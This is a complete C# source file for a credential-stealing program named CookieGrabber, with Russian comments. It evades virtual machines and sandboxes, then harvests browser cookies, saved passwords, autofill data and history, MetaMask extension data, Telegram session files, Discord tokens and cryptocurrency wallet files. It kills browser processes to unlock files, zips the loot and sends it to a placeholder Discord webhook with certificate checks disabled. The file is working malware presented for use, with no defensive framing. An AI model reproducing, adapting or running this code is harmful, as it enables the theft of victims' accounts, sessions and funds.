using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management; // добавить ссылку System.Management.dll
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace CookieGrabber
{
    class Program
    {
        private const string WebhookUrl = "!!!Your-Discord-Webhook!!!";
        private const int ChunkSize = 7 * 1024 * 1024;

        static async Task Main(string[] args)
        {
            // --- Anti-VM / Anti-Sandbox ---
            if (!IsRealMachine())
                return;

            // --- Основная логика ---
            try
            {
                var (loot, report) = CollectAllFiles();
                byte[] zipBytes = CreateZip(loot, report);
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                await SendToDiscord(zipBytes, timestamp, loot.Count);
            }
            catch { }
        }

        static bool IsRealMachine()
        {
            // 1. Проверка времени работы системы (песочница редко живёт дольше 10 минут)
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                foreach (var obj in searcher.Get())
                {
                    var lastBootUpTime = ManagementDateTimeConverter.ToDateTime(obj["LastBootUpTime"].ToString());
                    if (DateTime.Now - lastBootUpTime < TimeSpan.FromMinutes(10))
                        return false;
                }
            }

            // 2. Проверка ОЗУ (меньше 2 ГБ — подозрительно)
            using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
            {
                foreach (var obj in searcher.Get())
                {
                    ulong totalMemoryBytes = ulong.Parse(obj["TotalVisibleMemorySize"].ToString()) * 1024;
                    if (totalMemoryBytes < 2L * 1024 * 1024 * 1024)
                        return false;
                }
            }

            // 3. Проверка типичных процессов песочницы
            string[] sandboxProcesses = { "vbox", "vmtools", "vmsrvc", "xenservice", "sandbox", "procmon" };
            foreach (var proc in Process.GetProcesses())
            {
                try
                {
                    if (sandboxProcesses.Any(p => proc.ProcessName.ToLower().Contains(p)))
                        return false;
                }
                catch { }
            }

            return true;
        }

        // Вспомогательный CRC32 для проверки целостности чанков
        static uint ComputeCrc32(byte[] data)
        {
            uint crc = 0xFFFFFFFF;
            for (int i = 0; i < data.Length; i++)
            {
                crc ^= data[i];
                for (int j = 0; j < 8; j++)
                {
                    if ((crc & 1) != 0)
                        crc = (crc >> 1) ^ 0xEDB88320;
                    else
                        crc >>= 1;
                }
            }
            return ~crc;
        }

        static (Dictionary<string, byte[]> files, string report) CollectAllFiles()
        {
            var files = new Dictionary<string, byte[]>();
            var trace = new StringBuilder();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var chromiumRoots = new List<(string rootPath, string processName)>
            {
                (Path.Combine(localAppData, @"Google\Chrome\User Data"), "chrome"),
                (Path.Combine(localAppData, @"Microsoft\Edge\User Data"), "msedge"),
                (Path.Combine(localAppData, @"BraveSoftware\Brave-Browser\User Data"), "brave"),
                (Path.Combine(localAppData, @"Yandex\YandexBrowser\User Data"), "browser"),
                (Path.Combine(appData, @"Opera Software\Opera GX Stable\User Data"), "opera_gx"),
                (Path.Combine(localAppData, @"Opera Software\Opera GX Stable\User Data"), "opera_gx"),
                (Path.Combine(appData, @"Opera Software\Opera Stable\User Data"), "opera"),
                (Path.Combine(localAppData, @"Opera Software\Opera Stable\User Data"), "opera"),
                (Path.Combine(localAppData, @"Vivaldi\User Data"), "vivaldi"),
                (Path.Combine(localAppData, @"Chromium\User Data"), "chrome"),
            };

            foreach (var (rootPath, procName) in chromiumRoots)
            {
                if (!Directory.Exists(rootPath))
                {
                    trace.AppendLine($"[SKIP] {rootPath}");
                    continue;
                }
                trace.AppendLine($"[SCAN] {rootPath}");

                var profileDirs = new List<string>();
                try
                {
                    profileDirs = Directory.GetDirectories(rootPath)
                        .Where(d => Path.GetFileName(d).StartsWith("Default") || Path.GetFileName(d).StartsWith("Profile"))
                        .ToList();
                }
                catch { continue; }

                if (!profileDirs.Any() && Directory.Exists(Path.Combine(rootPath, "Default")))
                    profileDirs.Add(Path.Combine(rootPath, "Default"));

                foreach (var profileDir in profileDirs)
                {
                    string profileName = Path.GetFileName(profileDir);
                    GrabChromiumData(profileDir, "Network/Cookies", $"{procName}/{profileName}/cookies", procName, files, trace);
                    GrabChromiumData(profileDir, "Login Data", $"{procName}/{profileName}/passwords", procName, files, trace);
                    GrabChromiumData(profileDir, "Web Data", $"{procName}/{profileName}/autofill", procName, files, trace);
                    GrabChromiumData(profileDir, "History", $"{procName}/{profileName}/history", procName, files, trace);
                    GrabChromiumData(profileDir, "Bookmarks", $"{procName}/{profileName}/bookmarks", procName, files, trace, false);

                    string metamaskPath = Path.Combine(profileDir, "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn");
                    if (Directory.Exists(metamaskPath))
                    {
                        foreach (var file in Directory.GetFiles(metamaskPath))
                            GrabFile(file, $"{procName}/{profileName}/extensions/metamask/" + Path.GetFileName(file), procName, files, trace);
                    }
                }
            }

            // Firefox
            string ffProfiles = Path.Combine(appData, @"Mozilla\Firefox\Profiles");
            if (Directory.Exists(ffProfiles))
            {
                trace.AppendLine($"[SCAN] {ffProfiles}");
                foreach (var dir in Directory.GetDirectories(ffProfiles))
                {
                    string profileName = Path.GetFileName(dir);
                    GrabFile(Path.Combine(dir, "cookies.sqlite"), $"firefox/{profileName}/cookies.sqlite", "firefox", files, trace);
                    GrabFile(Path.Combine(dir, "logins.json"), $"firefox/{profileName}/logins.json", "firefox", files, trace);
                    GrabFile(Path.Combine(dir, "places.sqlite"), $"firefox/{profileName}/places.sqlite", "firefox", files, trace);
                }
            }

            // Telegram
            try
            {
                string tdata = LocateTelegramTdata();
                if (tdata != null)
                {
                    trace.AppendLine($"[SCAN] Telegram tdata: {tdata}");
                    foreach (var file in Directory.GetFiles(tdata, "*", SearchOption.TopDirectoryOnly))
                        GrabFile(file, "telegram/tdata/" + Path.GetFileName(file), "telegram", files, trace);
                }
            }
            catch { }

            // Discord leveldb
            string discordPath = Path.Combine(appData, "discord", "Local Storage", "leveldb");
            if (Directory.Exists(discordPath))
            {
                trace.AppendLine($"[SCAN] Discord leveldb: {discordPath}");
                foreach (var file in Directory.GetFiles(discordPath, "*.ldb"))
                    GrabFile(file, "discord/" + Path.GetFileName(file), "discord", files, trace);
                foreach (var file in Directory.GetFiles(discordPath, "*.log"))
                    GrabFile(file, "discord/" + Path.GetFileName(file), "discord", files, trace);
            }

            // Wallets
            GrabFile(Path.Combine(appData, "Exodus", "exodus.conf.json"), "wallets/exodus.conf.json", "exodus", files, trace);
            GrabFile(Path.Combine(appData, "atomic", "config.json"), "wallets/atomic_config.json", "atomic", files, trace);

            string report = trace.ToString();
            return (files, report);
        }

        static void GrabChromiumData(string profileDir, string relativePath, string archiveName, string procName, Dictionary<string, byte[]> files, StringBuilder trace, bool recursive = true)
        {
            if (recursive)
            {
                string parentDir = Path.GetDirectoryName(Path.Combine(profileDir, relativePath));
                string fileName = Path.GetFileName(relativePath);
                if (Directory.Exists(parentDir))
                {
                    var found = SafeGetFiles(parentDir, fileName, false);
                    if (found.Count > 0)
                    {
                        trace.AppendLine($"  [FOUND] {found[0]}");
                        if (TryReadFile(found[0], procName, out byte[] data))
                        {
                            files[archiveName] = data;
                            trace.AppendLine($"    [COPIED]");
                        }
                        else trace.AppendLine($"    [FAILED]");
                        return;
                    }
                }
                trace.AppendLine($"  [NOT FOUND] {relativePath}");
            }
            else
            {
                string fullPath = Path.Combine(profileDir, relativePath);
                GrabFile(fullPath, archiveName, procName, files, trace);
            }
        }

        static void GrabFile(string filePath, string archiveName, string processName, Dictionary<string, byte[]> files, StringBuilder trace)
        {
            if (!File.Exists(filePath))
            {
                trace.AppendLine($"  [NOT FOUND] {filePath}");
                return;
            }
            trace.AppendLine($"  [FOUND] {filePath}");
            if (TryReadFile(filePath, processName, out byte[] data))
            {
                files[archiveName] = data;
                trace.AppendLine($"    [COPIED]");
            }
            else trace.AppendLine($"    [FAILED]");
        }

        static List<string> SafeGetFiles(string rootDir, string pattern, bool recursive = true)
        {
            var results = new List<string>();
            if (recursive)
                SafeGetFilesRecursive(rootDir, pattern, results);
            else
            {
                try
                {
                    foreach (string filePath in Directory.GetFiles(rootDir, pattern))
                        results.Add(filePath);
                }
                catch { }
            }
            return results;
        }

        static void SafeGetFilesRecursive(string dir, string pattern, List<string> results)
        {
            try
            {
                foreach (string filePath in Directory.GetFiles(dir))
                {
                    try
                    {
                        if (string.Equals(Path.GetFileName(filePath), pattern, StringComparison.OrdinalIgnoreCase))
                            results.Add(filePath);
                    }
                    catch { }
                }
            }
            catch (UnauthorizedAccessException) { return; }
            catch { return; }

            string[] subDirs;
            try
            {
                subDirs = Directory.GetDirectories(dir);
            }
            catch { return; }

            foreach (string subDir in subDirs)
            {
                try { SafeGetFilesRecursive(subDir, pattern, results); } catch { }
            }
        }

        static string LocateTelegramTdata()
        {
            try
            {
                Process[] procs = Process.GetProcessesByName("Telegram");
                if (procs.Length > 0)
                {
                    try
                    {
                        string exePath = procs[0].MainModule.FileName;
                        string dir = Path.GetDirectoryName(exePath);
                        string possibleTdata = Path.Combine(dir, "tdata");
                        if (Directory.Exists(possibleTdata))
                            return possibleTdata;
                    }
                    catch { }
                }
            }
            catch { }

            string[] candidates = {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Telegram Desktop\tdata"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Telegram Desktop\tdata"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Telegram Desktop\tdata"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Telegram Desktop\tdata"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Telegram Desktop\tdata"),
                @"C:\Telegram Desktop\tdata"
            };
            foreach (var path in candidates)
            {
                try { if (Directory.Exists(path)) return path; } catch { }
            }

            string[] searchRoots = {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };
            foreach (var root in searchRoots)
            {
                try
                {
                    var found = SearchForTdata(root, 3);
                    if (found != null) return found;
                }
                catch { }
            }

            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Telegram Desktop"))
                {
                    if (key != null)
                    {
                        string installPath = key.GetValue("InstallLocation") as string;
                        if (!string.IsNullOrEmpty(installPath))
                        {
                            string tdataPath = Path.Combine(installPath, "tdata");
                            if (Directory.Exists(tdataPath)) return tdataPath;
                        }
                    }
                }
            }
            catch { }
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Telegram Desktop"))
                {
                    if (key != null)
                    {
                        string installPath = key.GetValue("InstallLocation") as string;
                        if (!string.IsNullOrEmpty(installPath))
                        {
                            string tdataPath = Path.Combine(installPath, "tdata");
                            if (Directory.Exists(tdataPath)) return tdataPath;
                        }
                    }
                }
            }
            catch { }

            return null;
        }

        static string SearchForTdata(string directory, int maxDepth)
        {
            if (maxDepth <= 0 || !Directory.Exists(directory)) return null;
            try
            {
                foreach (var subDir in Directory.GetDirectories(directory))
                {
                    try
                    {
                        if (Path.GetFileName(subDir).Equals("tdata", StringComparison.OrdinalIgnoreCase))
                            return subDir;
                        var result = SearchForTdata(subDir, maxDepth - 1);
                        if (result != null) return result;
                    }
                    catch { }
                }
            }
            catch { }
            return null;
        }

        static bool TryReadFile(string fullPath, string processName, out byte[] data)
        {
            try
            {
                data = File.ReadAllBytes(fullPath);
                return true;
            }
            catch
            {
                KillProcess(processName);
                Thread.Sleep(1200);
                try
                {
                    data = File.ReadAllBytes(fullPath);
                    return true;
                }
                catch
                {
                    data = null;
                    return false;
                }
            }
        }

        static void KillProcess(string name)
        {
            try
            {
                foreach (var p in Process.GetProcessesByName(name))
                {
                    try { p.Kill(); p.WaitForExit(3000); } catch { }
                }
            }
            catch { }
        }

        static byte[] CreateZip(Dictionary<string, byte[]> files, string report)
        {
            using (var ms = new MemoryStream())
            {
                using (var archive = new ZipArchive(ms, ZipArchiveMode.Create, true))
                {
                    foreach (var kvp in files)
                    {
                        var entry = archive.CreateEntry(kvp.Key, CompressionLevel.Optimal);
                        using (var es = entry.Open())
                            es.Write(kvp.Value, 0, kvp.Value.Length);
                    }
                    var reportEntry = archive.CreateEntry("report.txt", CompressionLevel.Optimal);
                    using (var stream = reportEntry.Open())
                    using (var writer = new StreamWriter(stream))
                    {
                        writer.Write(report);
                    }
                }
                return ms.ToArray();
            }
        }

        static async Task SendToDiscord(byte[] zipData, string timestamp, int filesCount)
        {
            var handler = new HttpClientHandler
            {
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                UseProxy = true,
                Proxy = WebRequest.GetSystemWebProxy(),
                ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true,
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13
            };
            handler.Proxy.Credentials = CredentialCache.DefaultCredentials;

            using (var client = new HttpClient(handler))
            {
                client.Timeout = TimeSpan.FromSeconds(60);
                client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");

                if (zipData.Length <= ChunkSize)
                {
                    uint crc = ComputeCrc32(zipData);
                    bool ok = await PostFile(client, zipData, $"loot_{timestamp}.zip", filesCount);
                    if (ok) await SendTextMessage(client, $"✅ Архив отправлен. CRC32: {crc:X8}");
                    else await SendTextMessage(client, "❌ Не удалось отправить архив.");
                    return;
                }

                int totalParts = (int)Math.Ceiling((double)zipData.Length / ChunkSize);
                await SendTextMessage(client, $"📦 Архив {zipData.Length / 1024} КБ разбит на {totalParts} частей.");

                for (int i = 0; i < totalParts; i++)
                {
                    int offset = i * ChunkSize;
                    int size = Math.Min(ChunkSize, zipData.Length - offset);
                    byte[] chunk = new byte[size];
                    Array.Copy(zipData, offset, chunk, 0, size);

                    uint crc = ComputeCrc32(chunk);
                    string partName = $"loot_{timestamp}_part{i + 1}of{totalParts}.zip";
                    bool sent = await PostFile(client, chunk, partName, filesCount, i + 1, totalParts);
                    if (!sent)
                    {
                        await SendTextMessage(client, $"❌ Ошибка при отправке части {i + 1}/{totalParts}.");
                        return;
                    }
                    await SendTextMessage(client, $"Часть {i + 1}/{totalParts} отправлена. CRC32: {crc:X8}");
                    await Task.Delay(1500);
                }
            }
        }

        static async Task<bool> PostFile(HttpClient client, byte[] fileData, string fileName, int filesCount, int part = 0, int total = 0)
        {
            for (int attempt = 1; attempt <= 3; attempt++)
            {
                try
                {
                    using (var content = new MultipartFormDataContent())
                    {
                        var fileContent = new ByteArrayContent(fileData);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                        content.Add(fileContent, "file", fileName);

                        string msg;
                        if (part > 0)
                            msg = $"Часть {part}/{total}. Всего файлов: {filesCount}.";
                        else
                            msg = $"Loot collected: {filesCount} files.";

                        content.Add(new StringContent(msg), "content");

                        var response = await client.PostAsync(WebhookUrl, content);
                        if (response.IsSuccessStatusCode) return true;
                    }
                }
                catch { }
                if (attempt < 3) await Task.Delay(2000);
            }
            return false;
        }

        static async Task SendTextMessage(HttpClient client, string message)
        {
            try
            {
                var payload = new StringContent($"{{\"content\":\"{message.Replace("\"", "\\\"")}\"}}", Encoding.UTF8, "application/json");
                await client.PostAsync(WebhookUrl, payload);
            }
            catch { }
        }
    }
}